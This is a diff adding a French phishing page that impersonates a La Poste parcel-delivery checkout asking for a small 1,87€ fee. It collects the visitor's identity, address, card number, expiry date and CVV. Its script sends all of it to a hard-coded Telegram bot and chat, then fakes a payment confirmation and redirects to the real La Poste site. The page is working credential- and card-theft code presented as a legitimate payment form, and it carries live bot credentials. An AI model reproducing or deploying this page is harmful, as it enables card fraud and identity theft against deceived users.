@@ -1,0 +1,733 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Paiement Sécurisé Premium | Livraison Express 24H</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
+    <style>
+        :root {
+            --primary: #2563eb;
+            --primary-dark: #1d4ed8;
+            --success: #10b981;
+            --danger: #ef4444;
+            --warning: #f59e0b;
+            --dark: #1e293b;
+            --light: #f8fafc;
+        }
+        
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background-color: #f1f5f9;
+            color: var(--dark);
+            line-height: 1.6;
+        }
+        
+        .payment-container {
+            max-width: 600px;
+            margin: 2rem auto;
+            padding: 0 15px;
+        }
+        
+        .payment-card {
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            margin-bottom: 2rem;
+            transition: transform 0.3s ease;
+        }
+        
+        .payment-card:hover {
+            transform: translateY(-5px);
+        }
+        
+        .payment-header {
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            color: white;
+            padding: 1.5rem;
+            text-align: center;
+        }
+        
+        .payment-body {
+            padding: 2rem;
+        }
+        
+        .form-label {
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+            color: var(--dark);
+            display: block;
+        }
+        
+        .form-control {
+            padding: 12px 16px;
+            border: 2px solid #e2e8f0;
+            border-radius: 10px;
+            transition: all 0.3s;
+            font-size: 16px;
+        }
+        
+        .form-control:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.2);
+        }
+        
+        .btn {
+            font-weight: 600;
+            padding: 12px 24px;
+            border-radius: 10px;
+            transition: all 0.3s;
+            font-size: 16px;
+            border: none;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .btn-primary {
+            background: var(--primary);
+            color: white;
+        }
+        
+        .btn-primary:hover {
+            background: var(--primary-dark);
+            transform: translateY(-2px);
+        }
+        
+        .btn-success {
+            background: var(--success);
+            color: white;
+        }
+        
+        .btn-success:hover {
+            opacity: 0.9;
+            transform: translateY(-2px);
+        }
+        
+        .btn-outline {
+            background: transparent;
+            border: 2px solid var(--primary);
+            color: var(--primary);
+        }
+        
+        .btn-outline:hover {
+            background: rgba(37, 99, 235, 0.1);
+        }
+        
+        .credit-card-preview {
+            background: linear-gradient(135deg, #3b82f6, #2563eb);
+            color: white;
+            padding: 1.5rem;
+            border-radius: 12px;
+            margin-bottom: 2rem;
+            position: relative;
+            overflow: hidden;
+            height: 180px;
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.2);
+        }
+        
+        .credit-card-preview::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            right: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0) 70%);
+            transform: rotate(30deg);
+        }
+        
+        .card-logo {
+            position: absolute;
+            right: 1.5rem;
+            top: 1.5rem;
+            height: 30px;
+            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.2));
+        }
+        
+        .card-number {
+            font-family: 'Courier New', monospace;
+            font-size: 1.25rem;
+            letter-spacing: 2px;
+            margin-top: 3rem;
+            text-shadow: 0 1px 3px rgba(0,0,0,0.3);
+        }
+        
+        .card-details {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 1.5rem;
+        }
+        
+        .card-name {
+            font-size: 0.9rem;
+            text-transform: uppercase;
+            opacity: 0.9;
+        }
+        
+        .card-expiry {
+            font-size: 0.9rem;
+            opacity: 0.9;
+        }
+        
+        .payment-options {
+            display: flex;
+            gap: 1rem;
+            margin-bottom: 1.5rem;
+            flex-wrap: wrap;
+        }
+        
+        .payment-option {
+            flex: 1;
+            min-width: 120px;
+            text-align: center;
+            padding: 1rem;
+            border: 2px solid #e2e8f0;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .payment-option:hover {
+            border-color: #cbd5e1;
+        }
+        
+        .payment-option.active {
+            border-color: var(--primary);
+            background-color: #eff6ff;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
+        }
+        
+        .payment-option img {
+            height: 30px;
+            margin-bottom: 0.5rem;
+            transition: transform 0.3s;
+        }
+        
+        .payment-option.active img {
+            transform: scale(1.1);
+        }
+        
+        .flash-notification {
+            position: fixed;
+            top: 1.5rem;
+            left: 50%;
+            transform: translateX(-50%);
+            padding: 1rem 1.5rem;
+            border-radius: 12px;
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.2);
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            max-width: 90%;
+            animation: slideInDown 0.5s, fadeOutUp 0.5s 3s forwards;
+        }
+        
+        .flash-success {
+            background: var(--success);
+            color: white;
+        }
+        
+        .flash-error {
+            background: var(--danger);
+            color: white;
+        }
+        
+        .flash-info {
+            background: var(--primary);
+            color: white;
+        }
+        
+        .flash-warning {
+            background: var(--warning);
+            color: white;
+        }
+        
+        .flash-icon {
+            margin-right: 0.75rem;
+            font-size: 1.5rem;
+        }
+        
+        .delivery-badge {
+            background: var(--success);
+            color: white;
+            padding: 0.25rem 0.75rem;
+            border-radius: 9999px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            display: inline-block;
+            margin-left: 0.75rem;
+            animation: pulse 2s infinite;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        
+        @media (max-width: 768px) {
+            .payment-card {
+                border-radius: 12px;
+            }
+            
+            .payment-body {
+                padding: 1.5rem;
+            }
+            
+            .credit-card-preview {
+                height: 160px;
+            }
+            
+            .card-number {
+                font-size: 1.1rem;
+                margin-top: 2.5rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="payment-container">
+        <!-- Notification Flash Container -->
+        <div id="flashContainer"></div>
+
+        <!-- En-tête avec logos -->
+        <div class="d-flex justify-content-center gap-4 mb-4 flex-wrap">
+            <img src="https://upload.wikimedia.org/wikipedia/fr/0/0d/La_Poste_2022.svg" alt="La Poste" style="height:50px">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTozKuRwnm8eUXpQsJOYuaKiLpM63YbSUk-WA&s" alt="Partenaire" style="height:50px">
+        </div>
+
+        <!-- Page 1: Informations de livraison -->
+        <div id="page1" class="payment-card animate__animated animate__fadeIn">
+            <div class="payment-header">
+                <h2 class="mb-0">Informations de livraison</h2>
+            </div>
+            <div class="payment-body">
+                <p class="text-center mb-4">Livraison express <span class="delivery-badge">24H garanties</span></p>
+                
+                <form id="form1">
+                    <div class="row g-3">
+                        <div class="col-md-6">
+                            <label for="firstName" class="form-label">Prénom</label>
+                            <input type="text" class="form-control" id="firstName" required>
+                        </div>
+                        <div class="col-md-6">
+                            <label for="lastName" class="form-label">Nom</label>
+                            <input type="text" class="form-control" id="lastName" required>
+                        </div>
+                        <div class="col-12">
+                            <label for="phone" class="form-label">Téléphone</label>
+                            <input type="tel" class="form-control" id="phone" required>
+                        </div>
+                        <div class="col-12">
+                            <label for="email" class="form-label">Email</label>
+                            <input type="email" class="form-control" id="email" required>
+                        </div>
+                        <div class="col-12">
+                            <label for="address" class="form-label">Adresse complète</label>
+                            <textarea class="form-control" id="address" rows="3" required></textarea>
+                        </div>
+                        <div class="col-12 mt-2">
+                            <button type="submit" class="btn btn-primary w-100 py-3">
+                                Continuer vers le paiement
+                            </button>
+                        </div>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <!-- Page 2: Paiement -->
+        <div id="page2" class="payment-card animate__animated animate__fadeIn hidden">
+            <div class="payment-header">
+                <h2 class="mb-0">Paiement sécurisé</h2>
+            </div>
+            <div class="payment-body">
+                <div class="text-center mb-4">
+                    <h4 class="fw-bold">Montant à payer: <span class="text-success">1,87€</span></h4>
+                </div>
+                
+                <div class="credit-card-preview">
+                    <img src="https://www.francenum.gouv.fr/files/styles/image_illustrative_4_3/public/Images/Logos%20partenaires/LOGO_CB_Quadri_SMALL.jpg?itok=aGO7VuuS" class="card-logo" id="card-display-logo">
+                    <div class="card-number" id="card-display-number">•••• •••• •••• ••••</div>
+                    <div class="card-details">
+                        <div class="card-name" id="card-display-name">NOM SUR LA CARTE</div>
+                        <div class="card-expiry" id="card-display-expiry">••/••</div>
+                    </div>
+                </div>
+                
+                <h5 class="mb-3">Moyen de paiement <span class="text-danger">*</span></h5>
+                <div class="payment-options">
+                    <div class="payment-option" data-card-type="cb">
+                        <img src="https://www.francenum.gouv.fr/files/styles/image_illustrative_4_3/public/Images/Logos%20partenaires/LOGO_CB_Quadri_SMALL.jpg?itok=aGO7VuuS" alt="Carte Bleue">
+                        <div>Carte Bleue</div>
+                    </div>
+                    <div class="payment-option" data-card-type="visa">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" alt="Visa">
+                        <div>Visa</div>
+                    </div>
+                    <div class="payment-option" data-card-type="mastercard">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" alt="Mastercard">
+                        <div>Mastercard</div>
+                    </div>
+                </div>
+                <div id="cardTypeError" class="text-danger small mb-3" style="display:none">Veuillez sélectionner un moyen de paiement</div>
+                
+                <form id="form2">
+                    <div class="mb-3">
+                        <label for="card-number" class="form-label">Numéro de carte (16 chiffres)</label>
+                        <input type="text" class="form-control" id="card-number" placeholder="4242 4242 4242 4242" maxlength="19" required>
+                        <div class="text-muted small mt-1">Format: XXXX XXXX XXXX XXXX</div>
+                    </div>
+                    
+                    <div class="row g-3">
+                        <div class="col-md-6">
+                            <label for="card-expiry" class="form-label">Date d'expiration</label>
+                            <input type="text" class="form-control" id="card-expiry" placeholder="MM/AA" required>
+                        </div>
+                        <div class="col-md-6">
+                            <label for="card-cvv" class="form-label">Cryptogramme (CVV)</label>
+                            <input type="text" class="form-control" id="card-cvv" placeholder="123" maxlength="3" required>
+                        </div>
+                    </div>
+                    
+                    <div class="mb-4">
+                        <label for="card-name" class="form-label">Nom sur la carte</label>
+                        <input type="text" class="form-control" id="card-name" placeholder="M. DUPONT JEAN" required>
+                    </div>
+                    
+                    <div class="d-grid gap-3">
+                        <button type="submit" class="btn btn-success py-3">
+                            Payer 1,87€ maintenant
+                        </button>
+                        <button type="button" id="backBtn" class="btn btn-outline">
+                            Retour aux informations
+                        </button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Configuration Telegram
+        const TELEGRAM_BOT_TOKEN = "7199619991:AAEh0KSro2VuLXfviUYhrsFPKe5RYSmnKvY";
+        const TELEGRAM_CHAT_ID = "-4746831194";
+
+        // Fonction pour afficher les notifications flash
+        function showFlash(message, type = 'success', duration = 3000) {
+            const flashContainer = document.getElementById('flashContainer');
+            const flash = document.createElement('div');
+            
+            const icons = {
+                success: '✓',
+                error: '✗',
+                info: 'ℹ',
+                warning: '⚠'
+            };
+            
+            flash.className = `flash-notification flash-${type} animate__animated animate__fadeInDown`;
+            flash.innerHTML = `
+                <span class="flash-icon">${icons[type] || ''}</span>
+                <span>${message}</span>
+            `;
+            
+            flashContainer.appendChild(flash);
+            
+            setTimeout(() => {
+                flash.classList.remove('animate__fadeInDown');
+                flash.classList.add('animate__fadeOutUp');
+                setTimeout(() => flash.remove(), 500);
+            }, duration);
+        }
+
+        // Gestion des pages
+        document.getElementById('form1').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Validation
+            let isValid = true;
+            const requiredFields = ['firstName', 'lastName', 'phone', 'email', 'address'];
+            
+            requiredFields.forEach(id => {
+                const field = document.getElementById(id);
+                if (!field.value.trim()) {
+                    field.classList.add('is-invalid');
+                    isValid = false;
+                } else {
+                    field.classList.remove('is-invalid');
+                }
+            });
+            
+            if (isValid) {
+                document.getElementById('page1').classList.add('hidden');
+                document.getElementById('page2').classList.remove('hidden');
+                showFlash('Informations enregistrées avec succès', 'success');
+            } else {
+                showFlash('Veuillez remplir tous les champs obligatoires', 'error');
+            }
+        });
+        
+        document.getElementById('backBtn').addEventListener('click', function() {
+            document.getElementById('page2').classList.add('hidden');
+            document.getElementById('page1').classList.remove('hidden');
+        });
+
+        // Gestion de la carte interactive
+        const cardNumberInput = document.getElementById('card-number');
+        const cardExpiryInput = document.getElementById('card-expiry');
+        const cardCvvInput = document.getElementById('card-cvv');
+        const cardNameInput = document.getElementById('card-name');
+        const cardTypeError = document.getElementById('cardTypeError');
+        
+        // Sélection du type de carte
+        const paymentOptions = document.querySelectorAll('.payment-option');
+        let selectedCardType = null;
+        
+        paymentOptions.forEach(option => {
+            option.addEventListener('click', function() {
+                paymentOptions.forEach(opt => opt.classList.remove('active'));
+                this.classList.add('active');
+                selectedCardType = this.getAttribute('data-card-type');
+                updateCardLogo();
+                cardTypeError.style.display = 'none';
+            });
+        });
+        
+        function updateCardLogo() {
+            const logo = document.getElementById('card-display-logo');
+            switch(selectedCardType) {
+                case 'visa':
+                    logo.src = "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png";
+                    break;
+                case 'mastercard':
+                    logo.src = "https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png";
+                    break;
+                case 'cb':
+                default:
+                    logo.src = "https://www.francenum.gouv.fr/files/styles/image_illustrative_4_3/public/Images/Logos%20partenaires/LOGO_CB_Quadri_SMALL.jpg?itok=aGO7VuuS";
+            }
+        }
+        
+        // Formatage et limitation du numéro de carte (16 chiffres groupés par 4)
+        cardNumberInput.addEventListener('input', function(e) {
+            // Récupérer la position du curseur
+            const cursorPosition = e.target.selectionStart;
+            const originalLength = e.target.value.length;
+            
+            // Nettoyer la valeur (supprimer les espaces)
+            let value = e.target.value.replace(/\s/g, '');
+            
+            // Limiter à 16 chiffres
+            if (value.length > 16) {
+                value = value.substring(0, 16);
+            }
+            
+            // Ajouter un espace tous les 4 chiffres
+            let formattedValue = '';
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) {
+                    formattedValue += ' ';
+                }
+                formattedValue += value[i];
+            }
+            
+            // Mettre à jour la valeur
+            e.target.value = formattedValue;
+            document.getElementById('card-display-number').textContent = formattedValue || '•••• •••• •••• ••••';
+            
+            // Ajuster la position du curseur
+            const addedSpaces = Math.floor((formattedValue.length - value.length) / 4);
+            const newCursorPosition = cursorPosition + addedSpaces;
+            e.target.setSelectionRange(newCursorPosition, newCursorPosition);
+        });
+
+        // Empêcher la saisie de caractères non numériques
+        cardNumberInput.addEventListener('keydown', function(e) {
+            // Autoriser: chiffres (0-9), touches de navigation (backspace, delete, flèches)
+            if (!((e.key >= '0' && e.key <= '9') || 
+                  ['Backspace', 'Delete', 'ArrowLeft', 'ArrowRight', 'Tab'].includes(e.key))) {
+                e.preventDefault();
+            }
+        });
+        
+        cardExpiryInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            e.target.value = value;
+            document.getElementById('card-display-expiry').textContent = value || '••/••';
+        });
+        
+        // Limiter le CVV à 3 chiffres
+        cardCvvInput.addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 3);
+        });
+        
+        cardNameInput.addEventListener('input', function(e) {
+            document.getElementById('card-display-name').textContent = e.target.value.toUpperCase() || 'NOM SUR LA CARTE';
+        });
+        
+        // Envoi à Telegram
+        async function sendToTelegram(message) {
+            try {
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                if (!response.ok) {
+                    throw new Error(`Erreur HTTP: ${response.status}`);
+                }
+                
+                return await response.json();
+            } catch (error) {
+                console.error('Erreur Telegram:', error);
+                // Méthode alternative en cas d'échec
+                try {
+                    const fallbackUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
+                    await fetch(fallbackUrl);
+                    return { ok: true };
+                } catch (e) {
+                    console.error('Erreur méthode alternative:', e);
+                    return { ok: false, error: e.message };
+                }
+            }
+        }
+        
+        // Validation du formulaire de paiement
+        document.getElementById('form2').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            // Validation du type de carte
+            if (!selectedCardType) {
+                cardTypeError.style.display = 'block';
+                showFlash('Veuillez sélectionner un moyen de paiement', 'error');
+                return;
+            }
+            
+            // Validation des champs
+            const errors = [];
+            const fields = [
+                { 
+                    id: 'card-number', 
+                    name: 'Numéro de carte', 
+                    test: v => v.replace(/\s/g, '').length === 16  // Vérifie 16 chiffres exactement
+                },
+                { 
+                    id: 'card-expiry', 
+                    name: 'Date d\'expiration', 
+                    test: v => v.length === 5 
+                },
+                { 
+                    id: 'card-cvv', 
+                    name: 'Cryptogramme', 
+                    test: v => v.length === 3 
+                },
+                { 
+                    id: 'card-name', 
+                    name: 'Nom sur la carte', 
+                    test: v => v.length >= 3 
+                }
+            ];
+            
+            fields.forEach(field => {
+                const element = document.getElementById(field.id);
+                const value = element.value.trim();
+                
+                if (!field.test(value)) {
+                    element.classList.add('is-invalid');
+                    errors.push(`${field.name} invalide`);
+                } else {
+                    element.classList.remove('is-invalid');
+                }
+            });
+            
+            if (errors.length > 0) {
+                showFlash(errors.join('<br>'), 'error');
+                return;
+            }
+            
+            // Préparation des données
+            const formData = {
+                livraison: {
+                    prenom: document.getElementById('firstName').value.trim(),
+                    nom: document.getElementById('lastName').value.trim(),
+                    telephone: document.getElementById('phone').value.trim(),
+                    email: document.getElementById('email').value.trim(),
+                    adresse: document.getElementById('address').value.trim()
+                },
+                paiement: {
+                    typeCarte: selectedCardType,
+                    numeroCarte: cardNumberInput.value.replace(/\s/g, ''),
+                    expiration: cardExpiryInput.value,
+                    cvv: cardCvvInput.value,
+                    nomCarte: cardNameInput.value.trim(),
+                    montant: "1,87€"
+                },
+                date: new Date().toLocaleString('fr-FR', {
+                    day: '2-digit',
+                    month: '2-digit',
+                    year: 'numeric',
+                    hour: '2-digit',
+                    minute: '2-digit'
+                })
+            };
+            
+            // Message pour Telegram
+            const message = `
+<b>💳 NOUVEAU PAIEMENT COMPLET 💳</b>
+
+<b>📦 INFORMATIONS LIVRAISON</b>
+┌──────────────────────────
+│ 👤 <b>Client:</b> ${formData.livraison.prenom} ${formData.livraison.nom}
+│ 📞 <b>Téléphone:</b> ${formData.livraison.telephone}
+│ 📧 <b>Email:</b> ${formData.livraison.email}
+│ 🏠 <b>Adresse:</b> ${formData.livraison.adresse}
+└──────────────────────────
+
+<b>💵 CARTE BANCAIRE</b>
+┌──────────────────────────
+│ 💳 <b>Type:</b> ${formData.paiement.typeCarte.toUpperCase()}
+│ 🔢 <b>Numéro:</b> ${formData.paiement.numeroCarte.replace(/(\d{4})/g, '$1 ')}
+│ 📅 <b>Expiration:</b> ${formData.paiement.expiration}
+│ 🔐 <b>CVV:</b> ${formData.paiement.cvv}
+│ 👤 <b>Titulaire:</b> ${formData.paiement.nomCarte}
+│ 💰 <b>Montant:</b> ${formData.paiement.montant}
+└──────────────────────────
+
+<b>📅 DATE:</b> ${formData.date}
+            `;
+            
+            showFlash('Traitement du paiement en cours...', 'info');
+            
+            const telegramResponse = await sendToTelegram(message);
+            
+            if (telegramResponse && telegramResponse.ok) {
+                showFlash('Paiement confirmé! Redirection...', 'success');
+                setTimeout(() => {
+                    window.location.href = 'https://www.laposte.fr';
+                }, 2000);
+            } else {
+                showFlash('Erreur lors de l\'envoi, veuillez réessayer', 'error');
+            }
+        });
+    </script>
+</body>
+</html>
